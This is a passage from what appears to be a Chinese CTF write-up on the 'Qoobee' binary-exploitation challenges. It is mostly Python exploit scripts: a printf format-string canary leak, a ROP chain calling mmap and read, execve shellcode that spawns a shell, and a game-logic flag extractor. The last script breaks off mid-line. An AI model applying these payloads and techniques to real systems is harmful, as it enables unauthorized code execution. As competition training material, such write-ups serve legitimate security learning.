class="number">36</span>), &amp;src, v1);</div><div class="line">  *(_BYTE *)(a1 + v1 + <span class="number">36</span>) = <span class="number">10</span>;</div><div class="line">  *(_BYTE *)(a1 + v1 + <span class="number">1</span> + <span class="number">36</span>) = <span class="number">0</span>;</div><div class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v5;</div><div class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v5 )</div><div class="line">    \_\_stack\_chk_fail(v2);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>先利用fun2的printf漏洞（见Qoobee6）读取canary 注意一次只读100 bytes，分两次执行</p>
<h2 id="利用代码-3"><a href="#利用代码-3" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">description stack overflow</div><div class="line">patched in qoobee4</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">target = <span class="string">'./qoobee'</span></div><div class="line">io = zio(target, timeout=<span class="number">800000</span>)</div><div class="line"></div><div class="line">read_buf = l32(<span class="number">0x804c090</span>)</div><div class="line">call_edx = l32(<span class="number">0x0804887d</span>)</div><div class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</div><div class="line">str_r = l32(<span class="number">0x08049F7C</span>)</div><div class="line">s = l32(<span class="number">0xffffce8d</span>)</div><div class="line">extern = l32(<span class="number">0x0804b7cc</span>)</div><div class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</div><div class="line">pr = l32(<span class="number">0x08048bc6</span>)</div><div class="line">ppr = l32(<span class="number">0x0804992a</span>)</div><div class="line">pppr = l32(<span class="number">0x08049929</span>)</div><div class="line">p7r = l32(<span class="number">0x08049925</span>)</div><div class="line">\<span class="comment"># gen by alpha2 baseaddr is eax</span></div><div class="line">shellcode = <span class="string">"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQo9kGyqNP4KrqPhDoToD3sXaxtoSRbIPnK9yszmK0wzA"</span></div><div class="line">\<span class="comment"># shellcode2  tiny sh without x0b</span></div><div class="line">shellcode2 = <span class="string">"x31xc9xf7xe1xb0xf4xf6xd0x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></div><div class="line">read_got = l32(<span class="number">0x08048660</span>)</div><div class="line">fopen_got = l32(<span class="number">0x08048780</span>)</div><div class="line">write_got = l32(<span class="number">0x08048760</span>)</div><div class="line">data = l32(<span class="number">0x0804B7A8</span>)</div><div class="line">bss = l32(<span class="number">0x0804b7c0</span>)</div><div class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</div><div class="line">mmap_got =l32(<span class="number">0x08048730</span>)</div><div class="line">fun1 = l32(<span class="number">0x08048D08</span>)</div><div class="line"></div><div class="line">\<span class="comment"># -214 mmap 0x80000000</span></div><div class="line">io.writeline(<span class="string">'-214'</span>)</div><div class="line">io.writeline(<span class="string">'hello'</span>)</div><div class="line"></div><div class="line">\<span class="comment"># adopt qoobee</span></div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'%11$08x'</span>)</div><div class="line"></div><div class="line">\<span class="comment"># show info</span></div><div class="line">io.writeline(<span class="string">'2'</span>)</div><div class="line">io.read_until(<span class="string">'Description: '</span>)</div><div class="line">canary = io.readline().strip()</div><div class="line"><span class="keyword">print</span> <span class="string">'canary:'</span>,canary</div><div class="line">canary = int(canary,<span class="number">16</span>)</div><div class="line">canary = l32(canary)</div><div class="line"><span class="keyword">print</span> <span class="string">'canary:'</span>,canary</div><div class="line"></div><div class="line">\<span class="comment"># io.gdb_hint()</span></div><div class="line">\<span class="comment"># p1</span></div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">payload = \[</div><div class="line">    <span class="comment"># ebp</span></div><div class="line">    l32(<span class="number">0x21000000</span>),</div><div class="line">    <span class="comment"># eip jmp pr</span></div><div class="line">    pr,</div><div class="line">    <span class="comment"># a1</span></div><div class="line">    l32(<span class="number">0x80000000</span>),</div><div class="line">    <span class="comment"># mmap</span></div><div class="line">    mmap_got,</div><div class="line">    <span class="comment"># p7r</span></div><div class="line">    p7r,</div><div class="line">    <span class="comment"># mmap args</span></div><div class="line">    l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>), l32(<span class="number">7</span>), l32(<span class="number">50</span>), l32(<span class="number">-1</span>), l32(<span class="number">0</span>),</div><div class="line">    l32(<span class="number">0</span>), <span class="comment">#padding</span></div><div class="line">    <span class="comment"># ret to fun1 again</span></div><div class="line">    fun1,</div><div class="line">\]</div><div class="line"></div><div class="line">p = <span class="string">'a'</span> * <span class="number">30</span> + canary + l32(<span class="number">0</span>) + l32(<span class="number">0</span>)</div><div class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> payload:</div><div class="line">    p += dword</div><div class="line"><span class="keyword">print</span> <span class="string">'payload1:'</span>, len(p)</div><div class="line"></div><div class="line">io.writeline(p)</div><div class="line"></div><div class="line">\<span class="comment"># p2</span></div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">payload2 = \[</div><div class="line">    <span class="comment"># ebp</span></div><div class="line">    l32(<span class="number">0x21000000</span>),</div><div class="line">    <span class="comment"># eip jmp pr</span></div><div class="line">    pr,</div><div class="line">    <span class="comment"># a1</span></div><div class="line">    l32(<span class="number">0x80000000</span>),</div><div class="line">    <span class="comment"># read</span></div><div class="line">    read_got,</div><div class="line">    <span class="comment"># jmp shellcode</span></div><div class="line">    l32(<span class="number">0x21000000</span>),</div><div class="line">    <span class="comment"># read args</span></div><div class="line">    l32(<span class="number">0</span>), l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>),</div><div class="line">\]</div><div class="line"></div><div class="line">p = <span class="string">'a'</span> * <span class="number">30</span> + canary + l32(<span class="number">0</span>) + l32(<span class="number">0</span>)</div><div class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> payload2:</div><div class="line">    p += dword</div><div class="line"><span class="keyword">print</span> <span class="string">'payload2:'</span>, len(p)</div><div class="line"></div><div class="line">io.writeline(p)</div><div class="line"></div><div class="line">io.writeline(shellcode2)</div><div class="line"></div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<h1 id="Qoobee5"><a href="#Qoobee5" class="headerlink" title="Qoobee5"></a>Qoobee5</h1><h2 id="利用分析-4"><a href="#利用分析-4" class="headerlink" title="利用分析"></a>利用分析</h2><p>比赛时候做的。。。和队友组合的代码，很乱很乱请见谅。。。 打游戏的方法。。利用printf漏洞刷钱。之后先升级，再通过石头剪刀布游戏的逻辑跑出flag…全部跑完要5分钟…… 比赛后面发现printf可以对age指定的任意内存写入……想想可以直接改等级然后打游戏会更快点……</p>
<h2 id="利用代码-4"><a href="#利用代码-4" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2.7  </span></div><div class="line">\<span class="comment"># -*- coding: utf-8 -*- </span></div><div class="line"><span class="string">'''</span></div><div class="line">Created on 2014年11月29日</div><div class="line"></div><div class="line">@author: yf</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">io = zio(<span class="string">'./qoobee4'</span>)<span class="comment">#, print\_write=False, print\_read=False)</span></div><div class="line">\<span class="comment"># io = zio(('10.11.12.13',1415), print\_write=False, print\_read=False)</span></div><div class="line">lose_dic = \[<span class="string">'scissor'</span>,<span class="string">'rock'</span>,<span class="string">'paper'</span>\]</div><div class="line">right_dic = \[<span class="string">'paper'</span>, <span class="string">'scissor'</span>,<span class="string">'rock'</span>\]</div><div class="line">divset = \[<span class="number">17</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>, <span class="number">32</span> , <span class="number">33</span> , <span class="number">34</span>  , <span class="number">35</span> , <span class="number">35</span>  , <span class="number">36</span> ,  <span class="number">37</span> , <span class="number">38</span> , <span class="number">39</span> , <span class="number">40</span>\]</div><div class="line">rightset = \[\]</div><div class="line">flag = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">losenum</span><span class="params">(modnum)</span>:</span></div><div class="line">    <span class="keyword">return</span> (modnum<span class="number">-1</span>+<span class="number">3</span>)%<span class="number">3</span></div><div class="line"></div><div class="line">\<span class="comment"># def testdiv(modnum):</span></div><div class="line">\<span class="comment"># #     while True:</span></div><div class="line">\<span class="comment">#     io.read_until('Your Choice: ')</span></div><div class="line">\<span class="comment">#     io.writeline('7')</span></div><div class="line">\<span class="comment">#     io.read_until('Select one:')</span></div><div class="line">\<span class="comment">#     io.writeline('%d' % losenum(modnum))</span></div><div class="line">\<span class="comment">#     io.read_until('number(0-100)? ')</span></div><div class="line">\<span class="comment">#     for i in divset:</span></div><div class="line">\<span class="comment">#         io.writeline('%d' % i)</span></div><div class="line">\<span class="comment">#         buf = io.read_until('n')</span></div><div class="line">\<span class="comment">#         if 'lose' in buf:</span></div><div class="line">\<span class="comment">#             io.writeline('7')</span></div><div class="line">\<span class="comment">#             io.read_until('Select one:')</span></div><div class="line">\<span class="comment">#             io.writeline('%d' % losenum(modnum))</span></div><div class="line">\<span class="comment">#             io.read_until('number(0-100)? ')</span></div><div class="line">\<span class="comment">#         else:</span></div><div class="line">\<span class="comment">#             print i</span></div><div class="line">\<span class="comment">#     pass</span></div><div class="line">pattern = re.compile(<span class="string">r'(d+)!'</span>,re.M)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkround2</span><span class="params">()</span>:</span></div><div class="line">    log(<span class="string">'enter checkround'</span>)</div><div class="line">    rst = &#123;&#125;</div><div class="line">    io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">    io.writeline(<span class="string">'paper'</span>)</div><div class="line">    buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="string">'lose'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'lose'</span>)</div><div class="line">        modnum = <span class="number">2</span></div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'Bye!'</span>)</div><div class="line">        log(buf)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'paper'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'tie'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="string">'$'</span></div><div class="line">        modnum = <span class="number">1</span></div><div class="line">        io.read_until(<span class="string">'Select one: '</span>)</div><div class="line">        io.writeline(<span class="string">'1234'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        io.writeline(<span class="string">'scissor'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'rock'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'win'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="string">'$'</span></div><div class="line">        modnum = <span class="number">0</span></div><div class="line">        io.read_until(<span class="string">'Select one: '</span>)</div><div class="line">        io.writeline(<span class="string">'1234'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        io.writeline(<span class="string">'paper'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    r = divnum*<span class="number">3</span> + modnum</div><div class="line">    log (<span class="string">"char is %d,'%c'"</span> % (r,chr(r)))</div><div class="line">    rightset.append(modnum)</div><div class="line">    log(<span class="string">'out checkround'</span>)</div><div class="line">    <span class="keyword">return</span> chr(r)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkround3</span><span class="params">()</span>:</span></div><div class="line">    log(<span class="string">'enter checkround'</span>)</div><div class="line">    rst = &#123;&#125;</div><div class="line">    io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">    io.writeline(<span class="string">'scissor'</span>)</div><div class="line">    buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="string">'lose'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'lose'</span>)</div><div class="line">        modnum = <span class="number">0</span></div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'Bye!'</span>)</div><div class="line">        log(buf)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'scissor'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'tie'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="string">'$'</span></div><div class="line">        modnum = <span class="number">2</span></div><div class="line">        io.read_until(<span class="string">'Select one: '</span>)</div><div class="line">        io.writeline(<span class="string">'1234'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        io.writeline(<span class="string">'scissor'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'paper'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'win'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="string">'$'</span></div><div class="line">        modnum = <span class="number">1</span></div><div class="line">        io.read_until(<span class="string">'Select one: '</span>)</div><div class="line">        io.writeline(<span class="string">'1234'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        io.writeline(<span class="string">'paper'</span>)</div><div class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    r = divnum*<span class="number">3</span> + modnum</div><div class="line">    log (<span class="string">"char is %d,'%c'"</span> % (r,chr(r)))</div><div class="line">    rightset.append(modnum)</div><div class="line">    log(<span class="string">'out checkround'</span>)</div><div class="line">    <span class="keyword">return</span> chr(r)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forlast2</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    log(<span class="string">'last round'</span>)</div><div class="line">    io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">    io.writeline(<span class="string">'7'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">        log(i)</div><div class="line">        log(right_dic\[i\])</div><div class="line">        io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">        io.writeline(right_dic\[i\])</div><div class="line">    c = checkround3()</div><div class="line">    <span class="keyword">if</span> c:</div><div class="line">        flag += c</div><div class="line">    log(<span class="string">'flag:%s'</span> % flag)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forlast</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    log(<span class="string">'last round'</span>)</div><div class="line">    io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">    io.writeline(<span class="string">'7'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">        log(i)</div><div class="line">        log(right_dic\[i\])</div><div class="line">        io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">        io.writeline(right_dic\[i\])</div><div class="line">    c = checkround2()</div><div class="line">    <span class="keyword">if</span> c==<span class="string">'$'</span>:</div><div class="line">        forlast2()</div><div class="line">    <span class="keyword">elif</span> c:</div><div class="line">        flag += c</div><div class="line">    log(<span class="string">'flag:%s'</span> % flag)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">        log(<span class="string">'new round'</span>)</div><div class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</div><div class="line">        io.writeline(<span class="string">'7'</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</div><div class="line">            log(i)</div><div class="line">            log(right_dic\[i\])</div><div class="line">            io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">            io.writeline(right_dic\[i\])</div><div class="line">        c = checkround()</div><div class="line">        <span class="keyword">if</span> c==<span class="string">'$'</span>:</div><div class="line">            forlast()</div><div class="line">        <span class="keyword">elif</span> c:</div><div class="line">            flag += c</div><div class="line">        log(<span class="string">'flag:%s'</span> % flag)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkround</span><span class="params">()</span>:</span></div><div class="line">    log(<span class="string">'enter checkround'</span>)</div><div class="line">    rst = &#123;&#125;</div><div class="line">    io.read_until(<span class="string">'Select one:'</span>)</div><div class="line">    io.writeline(<span class="string">'rock'</span>)</div><div class="line">    buf = io.read_until(<span class="string">'n'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="string">'lose'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'lose'</span>)</div><div class="line">        modnum = <span class="number">1</span></div><div class="line">        io.writeline(<span class="string">'0'</span>)</div><div class="line">        buf = io.read_until(<span class="string">'Bye!'</span>)</div><div class="line">        log(buf)</div><div class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</div><div class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'rock'</span> <span class="keyword">in</span> buf:</div><div class="line">        log(<span class="string">'tie'</span>)</div><div class="line">        modnum = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> len(rightset)==<span class="number">31</span>:</div><div class="line">            <span class="keyword">return</span> <span class="string">'$'</span></div><div class="line">        io.read_until(<span class="string">'Select one: '</span>)</div><div class="line">        io.writeline(<span class="string">'1234'</span>)</div><div 